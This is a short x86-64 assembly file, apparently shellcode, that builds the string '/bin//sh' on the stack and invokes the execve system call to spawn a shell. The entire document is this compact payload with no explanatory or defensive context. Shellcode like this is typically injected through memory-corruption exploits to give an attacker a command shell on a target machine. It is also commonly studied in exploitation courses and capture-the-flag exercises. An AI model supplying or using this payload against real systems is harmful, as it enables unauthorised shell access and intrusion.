.text
.global _start

_start:
	push %rax
	xor %rdx,%rdx
	xor %rsi,%rsi
	movabs $0x68732f2f6e69622f,%rbx 
	push %rbx
	push %rsp
	pop %rdi
	mov $59,%al
	syscall
	
